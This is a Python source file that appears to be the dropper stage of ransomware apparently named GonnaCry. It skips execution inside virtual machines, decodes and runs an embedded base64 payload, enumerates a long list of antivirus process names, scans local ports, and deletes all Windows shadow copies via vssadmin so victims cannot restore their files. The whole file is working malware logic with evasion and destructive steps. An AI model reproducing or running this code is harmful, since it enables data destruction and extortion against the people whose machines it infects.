import variables
import utils

import os
import subprocess
import socket
import requests
import base64
import sys


def check_av():
    av_list = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe', 'a2free.exe', 'a2guard.exe',
               'a2hijackfree.exe', 'a2scan.exe', 'a2service.exe', 'a2start.exe', 'a2sys.exe','a2upd.exe', 'aavgapi.exe',
               'aawservice.exe', 'aawtray.exe', 'ad-aware.exe', 'ad-watch.exe', 'alescan.exe', 'anvir.exe', 'ashdisp.exe',
               'ashmaisv.exe', 'ashserv.exe', 'ashwebsv.exe', 'aswupdsv.exe', 'atrack.exe', 'avgagent.exe', 'avgamsvr.exe',
               'avgcc.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgtcpsv.exe', 'avguard.exe', 'avgupsvc.exe', 'avgw.exe',
               'avkbar.exe', 'avk.exe', 'avkpop.exe', 'avkproxy.exe', 'avkservice.exe', 'avktray', 'avktray.exe', 'avkwctl', 
               'avkwctl.exe', 'avmailc.exe', 'avp.exe', 'avpm.exe', 'avpmwrap.exe', 'avsched32.exe', 'avwebgrd.exe', 'avwin.exe', 
               'avwupsrv.exe', 'avz.exe', 'bdagent.exe', 'bdmcon.exe', 'bdnagent.exe', 'bdss.exe', 'bdswitch.exe', 'blackd.exe', 
               'blackice.exe', 'blink.exe', 'boc412.exe', 'boc425.exe', 'bocore.exe', 'bootwarn.exe', 'cavrid.exe', 'cavtray.exe', 
               'ccapp.exe', 'ccevtmgr.exe', 'ccimscan.exe', 'ccproxy.exe', 'ccpwdsvc.exe', 'ccpxysvc.exe', 'ccsetmgr.exe', 'cfgwiz.exe', 
               'cfp.exe', 'clamd.exe', 'clamservice.exe', 'clamtray.exe', 'cmdagent.exe', 'cpd.exe', 'cpf.exe', 'csinsmnt.exe', 
               'dcsuserprot.exe', 'defensewall.exe', 'defensewall_serv.exe', 'defwatch.exe', 'f-agnt95.exe', 'fpavupdm.exe', 'f-prot95.exe',
               'f-prot.exe', 'fprot.exe', 'fsaua.exe', 'fsav32.exe', 'f-sched.exe', 'fsdfwd.exe', 'fsm32.exe', 'fsma32.exe', 'fssm32.exe', 
               'f-stopw.exe', 'f-stopw.exe', 'fwservice.exe', 'fwsrv.exe', 'iamstats.exe', 'iao.exe', 'icload95.exe', 'icmon.exe', 
               'idsinst.exe', 'idslu.exe', 'inetupd.exe', 'irsetup.exe', 'isafe.exe', 'isignup.exe', 'issvc.exe', 'kav.exe', 'kavss.exe', 
               'kavsvc.exe', 'klswd.exe', 'kpf4gui.exe', 'kpf4ss.exe', 'livesrv.exe', 'lpfw.exe', 'mcagent.exe', 'mcdetect.exe', 
               'mcmnhdlr.exe', 'mcrdsvc.exe', 'mcshield.exe', 'mctskshd.exe', 'mcvsshld.exe', 'mghtml.exe', 'mpftray.exe', 'msascui.exe', 
               'mscifapp.exe', 'msfwsvc.exe', 'msgsys.exe', 'msssrv.exe', 'navapsvc.exe', 'navapw32.exe', 'navlogon.dll', 'navstub.exe', 
               'navw32.exe', 'nisemsvr.exe', 'nisum.exe', 'nmain.exe', 'noads.exe', 'nod32krn.exe', 'nod32kui.exe', 'nod32ra.exe', 
               'npfmntor.exe', 'nprotect.exe', 'nsmdtr.exe', 'oasclnt.exe', 'ofcdog.exe', 'opscan.exe', 'ossec-agent.exe', 'outpost.exe', 
               'paamsrv.exe', 'pavfnsvr.exe', 'pcclient.exe', 'pccpfw.exe', 'pccwin98.exe', 'persfw.exe', 'protector.exe', 'qconsole.exe', 
               'qdcsfs.exe', 'rtvscan.exe', 'sadblock.exe', 'safe.exe', 'sandboxieserver.exe', 'savscan.exe', 'sbiectrl.exe', 'sbiesvc.exe', 
               'sbserv.exe', 'scfservice.exe', 'sched.exe', 'schedm.exe', 'schedulerdaemon.exe', 'sdhelp.exe', 'serv95.exe', 'sgbhp.exe', 
               'sgmain.exe', 'slee503.exe', 'smartfix.exe', 'smc.exe','snoopfreesvc.exe', 'snoopfreeui.exe', 'spbbcsvc.exe', 'sp_rsser.exe', 
               'spyblocker.exe', 'spybotsd.exe', 'spysweeper.exe', 'spysweeperui.exe', 'spywareguard.dll', 'spywareterminatorshield.exe', 
               'ssu.exe', 'steganos5.exe', 'stinger.exe', 'swdoctor.exe', 'swupdate.exe', 'symlcsvc.exe','symundo.exe', 'symwsc.exe', 
               'symwscno.exe', 'tcguard.exe', 'tds2-98.exe', 'tds-3.exe', 'teatimer.exe', 'tgbbob.exe', 'tgbstarter.exe', 'tsatudt.exe', 
               'umxagent.exe', 'umxcfg.exe', 'umxfwhlp.exe', 'umxlu.exe', 'umxpol.exe', 'umxtray.exe', 'usrprmpt.exe', 'vetmsg9x.exe', 
               'vetmsg.exe','vptray.exe', 'vsaccess.exe', 'vsserv.exe', 'wcantispy.exe', 'win-bugsfix.exe', 'winpatrol.exe', 'winpa""rolex.exe', 
               'wrsssdk.exe', 'xcommsvr.exe', 'xfr.exe', 'xp-antispy.exe', 'zegarynka.exe', 'zlclient.exe']
    
    command = 'tasklist /v /fo csv | findstr /i {}'

    for process in av_list:
        utils.run_subprocess(command.format(process))


def check_open_ports():
    for port in range (65535):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            
            if (result == 0):
                sock.close()
                yield(port)

            sock.close()
        except socket.error:
            pass


def delete_shadow_copies():
    os.system('vssadmin.exe delete shadows /all /quiet')


def inside_VM():
    command = 'dmidecode -t system'
    proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)

    if(proc.stderr.readlines()):
        return False
    
    ret = proc.stdout.readlines()
    output = [i.decode('utf-8') for i in ret]
    if('Virtual Machine' in ''.join(output)):
        return True
    return False


def drop_n_run_gonnacry():
    with open(variables.gonnacry_path, 'wb') as f:
        f.write(base64.b64decode(variables.gonnacry))
        
    command = '.{}'.format(variables.gonnacry_path)
    utils.run_subprocess(command)


if __name__ == "__main__":
    if(not inside_VM()):
        drop_n_run_gonnacry()
    else:
        sys.exit(-1)
        
